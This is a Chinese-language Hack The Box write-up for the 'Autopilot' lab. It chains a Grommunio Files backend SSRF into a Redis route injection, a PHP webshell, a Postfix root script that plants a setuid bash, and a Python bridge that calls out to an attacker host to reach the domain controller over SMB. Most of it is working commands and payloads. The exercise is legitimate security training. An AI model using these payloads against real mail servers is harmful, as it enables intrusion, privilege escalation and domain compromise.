---
title: "HTB Autopilot：Grommunio Files 的 SSRF 进 Redis，一路拿到域管"
date: 2026-11-18
categories: ["网络攻防"]
tags: ["HTB", "靶场", "Grommunio", "Nextcloud", "SSRF", "Redis", "Postfix", "Active Directory"]
description: "HTB Autopilot（Insane）：用最普通的邮箱账号把 Files 插件的 Seafile 后端指向 webapp 自己，制造 SSRF 写 Redis 路由换 webshell，再借本地 Admin API 改 Postfix 拿 root，最后用域管凭据经靶机桥接读 DC01 的 root.txt"
draft: false
password: true
---

Autopilot 只有 443 一个端口，但后面是一整套邮件栈：Grommunio Web、Nextcloud 派生的 Files、EWS/ActiveSync，再往里是 DC01 和一台工作站。整条链最漂亮的地方是**把一个「用户可控后端」做成了 SSRF**——不需要外网服务器，Files 插件可以直接指向 webapp 自己的下载接口。

| 项目 | 内容 |
| --- | --- |
| 目标 | 10.129.2.231（Autopilot） |
| 系统 | Windows AD / Insane，前置 Grommunio（Linux） |
| 初始凭据 | `deborah.hernandez` / `8F5cgp@tC8g@` |
| 关键点 | Files 后端可控、gopher SSRF、Redis route 注入、Admin API 改 Postfix |

## 0. 侦察

```bash
nmap -Pn -sS -p- --min-rate 1500 --open 10.129.2.231
# 443/tcp open  https
```

证书 SAN 直接给全了 vhost：

```
DNS:grommunio.autopilot.htb, DNS:autodiscover.autopilot.htb, DNS:mail.autopilot.htb
```

```bash
echo '10.129.2.231 grommunio.autopilot.htb mail.autopilot.htb autodiscover.autopilot.htb' >> /etc/hosts
```

三个入口：

- `/web/` —— Grommunio Web（Zarafa WebApp 派生），邮箱 + Files 面板；
- `/files/` —— Nextcloud 派生的 Files（WebDAV 在 `/files/remote.php/dav/`）；
- `/EWS/`、`/Microsoft-Server-ActiveSync`、`/Autodiscover` —— 邮件协议入口。

Deborah 的凭据两个都能登：

```bash
curl -ksS -u 'deborah.hernandez:8F5cgp@tC8g@' -X PROPFIND -H 'Depth: 1' \
  https://grommunio.autopilot.htb/files/remote.php/dav/files/deborah.hernandez/
# 207 Multi-Status
```

> 邮件里能看到 Joshua Harris（新开的服务账号）和 Stephanie Lewis，但 EWS 代收给别人一律 denied。真正的面在 Files。

## 1. Files 插件：后端地址由用户填

Grommunio Web 的 Files 面板允许用户自己加「文件后端」，后端类型有 Webdav / Seafile / Default，配置字段就是 `server_address`、`server_port`、`server_ssl`、`user`、`password`、`server_path`。

界面只是壳，真正落库的是这段 API（登录后的 session 即可）：

```bash
curl -ksS -b jar -H 'Content-Type: application/json' -H 'Origin: https://grommunio.autopilot.htb' \
  --data '{"grommunio":{"filesaccountmodule":{"1":{"save":{"props":{
    "name":"mock","backend":"Seafile",
    "backend_config":{
      "server_address":"mail.autopilot.htb","server_port":"443","server_ssl":"1",
      "server_path":"web/index.php?load=download_attachment&store=<store>&entryid=<eml>&attachCid=mock",
      "user":"@auth:token:deborah","password":"x",
      "use_grommunio_credentials":"0"}}}}}}}' \
  https://grommunio.autopilot.htb/web/grommunio.php
```

关键不是把服务器填成自己的 Kali，而是**填成 webapp 自己**：

- `server_path` 指向 `index.php?load=download_attachment`，带上我们自己邮件里的附件 ID；
- 插件请求 `https://mail.autopilot.htb:443/<server_path>/api2/...` 时，webapp 会把邮件附件原样吐回来；
- 于是「Seafile 服务器」的响应完全由我们控制，等于在靶机内部造了一个可控后端。

附件是用一封伪造的邮件塞进 Deborah 邮箱的：先建一个 draft 上传三段内容，再 `import=1` 导入一封带 `Content-Location` 的 EML，让三个附件的路径分别对应：

```
mock/api2/ping/                                  -> "pong"
mock/api2/repos/                                 -> [{"type":"repo","name":"mock","id":"1111...","mtime":0}]
mock/api2/repos/<id>/file/?p=/route_exec         -> "gopher://127.0.0.1:6379/_..."
```

> 注意 `server_ssl` 必须是**空数组** `[]` 才会走 http；字符串 `"0"`、`"false"`、布尔 `false` 在这版后端里要么被当成真、要么被丢掉回落到默认的 443/https，结果是 `TLS connect error ... wrong version number`——它在跟我们的 http 端口说 hello。界面里没有「version 0」这个选项，直接写 API 才行。

## 2. Redis 路由注入 → grofiles webshell

Files 插件会去下载 `file/?p=/route_exec` 返回的地址。地址是：

```
gopher://127.0.0.1:6379/_<urlencoded RESP>
```

也就是一个贴着 Redis 的 SSRF。写入的 key 是 Nextcloud 的 route 表：

```
SETEX <instanceid>/route<host>#/files/index.php#rootCollection 120 {
  "ctf": [["/ctf", [{"_route":"ctf","file":"/var/lib/grommunio-files/data/deborah.hernandez/files/rclprobe.txt"},
          null, {"GET":0}, null, false, false, null]]]
}
```

意思是：`/files/index.php/ctf` 这条路由交给刚才用 WebDAV 上传的 PHP 文件处理。上一步顺手已经通过 WebDAV 放了 `rclprobe.txt`：

```php
<?php header("Content-Type: text/plain");
$c=$_GET["cmd"]??"id"; @passthru($c." 2>&1"); ?>
```

触发一次 `downloadtotmp`（`ids: ["#R#<account>/mock/route_exec"]`）就会让插件去 fetch 那个 gopher 地址，Redis 收下 SETEX。之后直接打 webshell：

![Files 后端指向自身 → gopher 写 Redis 路由 → /files/index.php/ctf 以 grofiles 执行](../../autopilot/01-foothold.png)

```
uid=462(grofiles) gid=462(grofiles) groups=462(grofiles)
grommunio
```

## 3. 本地 Admin API：改 Postfix 拿 root

拿到 shell 后第一件事是看谁在本地监听——`grommunio Admin API` 在 `127.0.0.1:8080`，外网永远碰不到，但现在我们就在本机。

它需要 admin 登录，而 admin 的密码在 MySQL 里。MySQL 凭据就躺在 Postfix 的配置文件里：

```bash
cat /etc/postfix/grommunio-virtual-mailbox-maps.cf
# user = grommunio
# password = <明文>
# dbname = grommunio
```

于是：

```sql
UPDATE users SET password = UNHEX('<sha512-crypt(临时密码) 的 hex>') WHERE id = 0;
```

用临时密码登 `127.0.0.1:8080/api/v1/login` 拿 JWT 和 csrf，然后 PATCH 两个配置：

```
PATCH /api/v1/system/dbconf/grommunio-dbconf/postfix/   {"commit_file":"#POSTCONF"}
PATCH /api/v1/system/dbconf/postfix/ctf/                {"daemon_directory":"<staged>"}
```

`commit_file=#POSTCONF` 会让 dbconf 在写配置时执行 `postconf`；而 `daemon_directory` 指向我们自己的目录，里面放一个同名 `postfix-script`：

```sh
#!/bin/sh
id > proof
cp /bin/bash /var/lib/grommunio-files/data/deborah.hernandez/files/.rootbash
chown root:root .rootbash && chmod 4755 .rootbash
postconf -e "daemon_directory = /usr/lib/postfix/bin"
exec /usr/lib/postfix/bin/postfix-script "$@"
```

Postfix 一重载就以 root 执行它，setuid bash 落地：

![Admin API 改 dbconf → Postfix 执行我们的脚本 → euid=0](../../autopilot/02-root.png)

```
uid=462(grofiles) gid=462(grofiles) euid=0(root) groups=462(grofiles)
```

user flag 在 `/root/user.txt`。

## 4. 到 DC01：DA 凭据 + 靶机侧桥接

域管凭据来自工作站上的 `runas.exe`（Go 写的，密码用循环 XOR 藏在 `.rdata` 里，解出来是 `da-stephanie.lewis` 的口令）。这一步在公开解法里已经是常量，本文直接用。

DC01 在 `172.16.20.1`，从 Kali 到不了；但被拿下的邮件服务器到得了。最省事的做法不是反向隧道，而是**让靶机替我们连**：

```python
# 靶机 root 上的一性脚本：一条 TCP 桥
with socket.create_connection((CALLBACK_IP, 19002)) as tunnel:
    with socket.create_connection(("172.16.20.1", 445)) as remote:
        tunnel.sendall(token + b"\x00")   # 16 字节随机 token + 连接状态
        # 之后 select 双向转发
```

本地 `impacket` 的 `SMBConnection` 连到这条桥，用 DA 登录后直接读管理共享：

```python
smb = SMBConnection("DC01", "127.0.0.1", sess_port=port)
smb.login("da-stephanie.lewis", "<password>", "AUTOPILOT")
buf = bytearray(); smb.getFile("C$", r"Users\Administrator\Desktop\root.txt", buf.extend)
```

![靶机侧一次性桥 → 本地 SMB 读 C$ → root.txt](../../autopilot/03-dc-smb.png)

## 复盘：这条链哪里最容易卡

| 环节 | 坑 | 结论 |
| --- | --- | --- |
| Files 后端 | `server_ssl` 类型 | 只有空数组才走 http；字符串/布尔会被当真或丢弃，报 TLS wrong version number |
| Files 后端 | 自签证书 | 后端 HTTPS 会校验证书，指向外部服务器走不通，只能指向 webapp 自己 |
| SSRF | 只认 `gopher://` | 返回体直接当成 URL 去 fetch，不需要 302 |
| Redis | key 前缀 | 是 Nextcloud 的 instanceid，route 表按 host + 路径拼 |
| 提权 | Admin API 只听 127.0.0.1 | 必须在靶机上打，正好我们有 grofiles RCE |
| 回连 | WSL 的 NAT 地址靶机到不了 | 用靶机侧主动连出的桥，或者干脆在靶机上装客户端 |

两个提醒：改 admin 密码、改 dbconf 都是破坏性的，做完要还原；靶机上的 setuid bash 用完删掉。
